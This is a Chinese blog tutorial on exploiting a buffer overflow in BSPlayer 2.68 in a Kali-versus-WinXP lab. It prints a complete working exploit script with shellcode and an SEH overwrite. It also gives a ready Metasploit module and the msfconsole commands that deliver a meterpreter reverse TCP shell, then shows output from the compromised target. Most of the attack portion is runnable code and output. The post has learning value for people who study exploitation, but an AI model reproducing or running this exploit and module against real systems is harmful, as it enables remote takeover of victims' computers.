---
layout: post
category: binghe-code-hack
title: Metasploit渗透BSPlayer V2.68
tagline: by 冰河
tag: [hack,binghe-code-hack]
excerpt: Metasploit渗透BSPlayer V2.68
lock: need
---

# Metasploit渗透BSPlayer V2.68

攻击机 Kali 192.168.109.137

靶机 WinXP 192.168.109.141

应用程序 BSPlayer V2.68 (可以到链接https://download.csdn.net/download/l1028386804/10923699下载BSPlayer V2.68 + 渗透脚本 )

## 运行渗透脚本36477.py

在靶机的命令行下切换到脚本36477.py所在的目录并输入如下命令：

```
python 36477.py 127.0.0.1 81
```



![img](https://img-blog.csdnimg.cn/20190117180920798.png)

## 安装并打开Bsplayer

安装略。

![img](https://img-blog.csdnimg.cn/20190117180940577.png)

此时，在Bsplayer中依次单击menu->打开 URL(U)... 载入要加载的链接，这里载入的链接为脚本36477.py监听的地址和端口,即：http://127.0.0.1:81，如下图：

![img](https://img-blog.csdnimg.cn/20190117181000232.png)

![img](https://img-blog.csdnimg.cn/20190117181008451.png)

点击确定后，发现弹出了计算器窗口。

![img](https://img-blog.csdnimg.cn/20190117181025522.png)

说明BSPlayer V2.68 存在溢出漏洞。

## 分析36477.py脚本

脚本具体内容如下：

```
#!/usr/bin/python

''' Bsplayer suffers from a buffer overflow vulnerability when processing the HTTP response when opening a URL.
In order to exploit this bug I partially overwrited the seh record to land at pop pop ret instead of the full
address and then used backward jumping to jump to a long jump that eventually land in my shellcode.

Tested on : windows xp sp1 - windows 7 sp1 - Windows 8 Enterprise it might work in other versions as well just give it a try :)

My twitter: @fady_osman
My youtube: https://www.youtube.com/user/cutehack3r
'''

import socket
import sys
s = socket.socket()         # Create a socket object
if(len(sys.argv) < 3):
  print "[x] Please enter an IP and port to listen to."
  print "[x] " + sys.argv[0] + " ip port"
  exit()
host = sys.argv[1]      # Ip to listen to.
port = int(sys.argv[2])     # Reserve a port for your service.
s.bind((host, port))        # Bind to the port
print "[*] Listening on port " + str(port)
s.listen(5)                 # Now wait for client connection.
c, addr = s.accept()        # Establish connection with client.
# Sending the m3u file so we can reconnect to our server to send both the flv file and later the payload.
print(('[*] Sending the payload first time', addr))
c.recv(1024)
#seh and nseh.
buf =  ""
buf += "\xbb\xe4\xf3\xb8\x70\xda\xc0\xd9\x74\x24\xf4\x58\x31"
buf += "\xc9\xb1\x33\x31\x58\x12\x83\xc0\x04\x03\xbc\xfd\x5a"
buf += "\x85\xc0\xea\x12\x66\x38\xeb\x44\xee\xdd\xda\x56\x94"
buf += "\x96\x4f\x67\xde\xfa\x63\x0c\xb2\xee\xf0\x60\x1b\x01"
buf += "\xb0\xcf\x7d\x2c\x41\xfe\x41\xe2\x81\x60\x3e\xf8\xd5"
buf += "\x42\x7f\x33\x28\x82\xb8\x29\xc3\xd6\x11\x26\x76\xc7"
buf += "\x16\x7a\x4b\xe6\xf8\xf1\xf3\x90\x7d\xc5\x80\x2a\x7f"
buf += "\x15\x38\x20\x37\x8d\x32\x6e\xe8\xac\x97\x6c\xd4\xe7"
buf += "\x9c\x47\xae\xf6\x74\x96\x4f\xc9\xb8\x75\x6e\xe6\x34"
buf += "\x87\xb6\xc0\xa6\xf2\xcc\x33\x5a\x05\x17\x4e\x80\x80"
buf += "\x8a\xe8\x43\x32\x6f\x09\x87\xa5\xe4\x05\x6c\xa1\xa3"
buf += "\x09\x73\x66\xd8\x35\xf8\x89\x0f\xbc\xba\xad\x8b\xe5"
buf += "\x19\xcf\x8a\x43\xcf\xf0\xcd\x2b\xb0\x54\x85\xd9\xa5"
buf += "\xef\xc4\xb7\x38\x7d\x73\xfe\x3b\x7d\x7c\x50\x54\x4c"
buf += "\xf7\x3f\x23\x51\xd2\x04\xdb\x1b\x7f\x2c\x74\xc2\x15"
buf += "\x6d\x19\xf5\xc3\xb1\x24\x76\xe6\x49\xd3\x66\x83\x4c"
buf += "\x9f\x20\x7f\x3c\xb0\xc4\x7f\x93\xb1\xcc\xe3\x72\x22"
buf += "\x8c\xcd\x11\xc2\x37\x12"

jmplong = "\xe9\x85\xe9\xff\xff"
nseh = "\xeb\xf9\x90\x90"
# Partially overwriting the seh record (nulls are ignored).
seh = "\x3b\x58\x00\x00"
buflen = len(buf)
response = "\x90" *2048 + buf + "\xcc" * (6787 - 2048 - buflen) + jmplong + nseh + seh #+ "\xcc" * 7000
c.send(response)
c.close()
c, addr = s.accept()        # Establish connection with client.
# Sending the m3u file so we can reconnect to our server to send both the flv file and later the payload.
print(('[*] Sending the payload second time', addr))
c.recv(1024)
c.send(response)
c.close()
s.close()
```



由此脚本我们可以得出几个重要的信息：

![img](https://img-blog.csdnimg.cn/20190117181117230.png)

由此，我们就可以编写渗透模块了。

**注意：在当前场景中，需要目标计算机主动来连接我们的渗透服务器，而不是我们去连接目标服务器。因此我们的渗透服务器必须时刻对即将到来的连接处于监听状态。当收到目标请求之后，要向其发送恶意的内容。**

## 创建Metasploit渗透脚本bsplayer_attack_by_binghe.rb

```
##
# Author 冰河
# Date 2019-01-17
# Description Metasploit渗透 Bsplayer V2.68
#
# 在当前场景中，需要目标计算机主动来连接我们的渗透服务器，而不是我们去连接目标服务器。
# 因此我们的渗透服务器必须时刻对即将到来的连接处于监听状态。当收到目标请求之后，要向
# 其发送恶意的内容。
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking
  
  include Msf::Exploit::Remote::TcpServer
  
  def initialize(info = {})
    super(update_info(info,
      'Name'              => "BsPlayer 2.68 SEH Overflow Exploit",
      'Description'       => %q{
          Here's an example of server Based Exploit
      },
      'Author'            => ['binghe'],
      'Platform'          => 'Windows',
      'Targets'           => 
        [
          ['Generic', {'Ret'  => 0x0000583b, 'Offset' => 2048}],
        ],
      'Payload'           =>
        {
          'BadChars'      => "\x00\x0a\x20\x0d"
        },
      'DisclosureDate'    => "2017-01-17",
      'DefaultTarget'     => 0))
   end
   
  def on_client_connect(client)
    return if((p = regenerate_payload(client)) == nil)
    print_status("Client Connected")
    sploit = make_nops(target['Offset'])
    sploit << payload.encoded
    sploit << "\xcc" * (6787 - 2048 - payload.encoded.length)
    sploit << "\xe9\x85\xe9\xff\xff"
    sploit << "\xeb\xf9\x90\x90"
    sploit << [target.ret].pack('V')
    client.put(sploit)
    client.get_once
    client.put(sploit)
    handler(client)
    service.close_client(client)
  end
end
```

## 上传渗透脚本bsplayer_attack_by_binghe.rb

将渗透脚本bsplayer_attack_by_binghe.rb上传到Kali的/usr/share/metasploit-framework/modules/exploits/windows/masteringmetasploit目录下

## 运行渗透脚本bsplayer_attack_by_binghe.rb

```
msfconsole
use exploit/windows/masteringmetasploit/bsplayer_attack_by_binghe 
set SRVHOST 192.168.109.137
set SRVPORT 8080
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.109.137
set LPORT 8888
show options
exploit
```

具体操作效果如下：

```
msf > use exploit/windows/masteringmetasploit/bsplayer_attack_by_binghe 
msf exploit(windows/masteringmetasploit/bsplayer_attack_by_binghe) > set SRVHOST 192.168.109.137
SRVHOST => 192.168.109.137
msf exploit(windows/masteringmetasploit/bsplayer_attack_by_binghe) > set SRVPORT 8080
SRVPORT => 8080
msf exploit(windows/masteringmetasploit/bsplayer_attack_by_binghe) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(windows/masteringmetasploit/bsplayer_attack_by_binghe) > set LHOST 192.168.109.137
LHOST => 192.168.109.137
msf exploit(windows/masteringmetasploit/bsplayer_attack_by_binghe) > set LPORT 8888
LPORT => 8888
msf exploit(windows/masteringmetasploit/bsplayer_attack_by_binghe) > show options

Module options (exploit/windows/masteringmetasploit/bsplayer_attack_by_binghe):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  192.168.109.137  yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
   SRVPORT  8080             yes       The local port to listen on.
   SSL      false            no        Negotiate SSL for incoming connections
   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.109.137  yes       The listen address (an interface may be specified)
   LPORT     8888             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Generic


msf exploit(windows/masteringmetasploit/bsplayer_attack_by_binghe) > exploit
[*] Exploit running as background job 0.

[*] Started reverse TCP handler on 192.168.109.137:8888 
msf exploit(windows/masteringmetasploit/bsplayer_attack_by_binghe) > [*] Started service listener on 192.168.109.137:8080 
[*] Server started.
```

## 打开Bsplay并设置打开的URL

打开Bsplay并将URL设置为http://192.168.109.137:8080,点击确定按钮

![img](https://img-blog.csdnimg.cn/20190117181414585.png)

![img](https://img-blog.csdnimg.cn/20190117181421865.png)

![img](https://img-blog.csdnimg.cn/2019011718143024.png)

## 查看Kali终端结果

此时，我们切换到Kali下查看结果，输出如下：

```
[*] Client Connected
[*] Client Connected
[*] Sending stage (179779 bytes) to 192.168.109.141
meterpreter > ifconfig

Interface  1
============
Name         : MS TCP Loopback interface
Hardware MAC : 00:00:00:00:00:00
MTU          : 1520
IPv4 Address : 127.0.0.1


Interface 65539
============
Name         : VMware Accelerated AMD PCNet Adapter
Hardware MAC : 00:0c:29:5d:8e:d4
MTU          : 1500
IPv4 Address : 192.168.109.141
IPv4 Netmask : 255.255.255.0


Interface 65540
============
Name         : Bluetooth �s
Hardware MAC : 3c:a0:67:1a:fe:b4
MTU          : 1500

meterpreter > 
```

此时，我们通过BSPlayer的漏洞拿下了目标主机的Materpreter Shell。


## 写在最后

> 如果你觉得冰河写的还不错，请微信搜索并关注「 **冰河技术** 」微信公众号，跟冰河学习高并发、分布式、微服务、大数据、互联网和云原生技术，「 **冰河技术** 」微信公众号更新了大量技术专题，每一篇技术文章干货满满！不少读者已经通过阅读「 **冰河技术** 」微信公众号文章，吊打面试官，成功跳槽到大厂；也有不少读者实现了技术上的飞跃，成为公司的技术骨干！如果你也想像他们一样提升自己的能力，实现技术能力的飞跃，进大厂，升职加薪，那就关注「 **冰河技术** 」微信公众号吧，每天更新超硬核技术干货，让你对如何提升技术能力不再迷茫！


![](https://img-blog.csdnimg.cn/20200906013715889.png)